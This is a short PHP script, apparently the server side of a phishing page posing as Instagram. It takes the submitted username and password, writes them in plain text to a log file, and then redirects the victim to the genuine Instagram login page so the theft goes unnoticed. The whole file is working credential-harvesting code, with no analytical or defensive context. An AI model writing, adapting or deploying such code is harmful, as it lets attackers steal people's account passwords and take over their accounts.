<?php
$name1=strip_tags($_POST["username"]);
$name2=strip_tags($_POST["password"]);
$file=fopen("log.txt","a");
fwrite($file, 'USER: '.$name1."\nPASS: ".$name2."\n\n");{
fclose($file);
} ?>


<html>
<meta http-equiv="refresh" content="0; URL='https://www.instagram.com/accounts/login/'" />
</html>
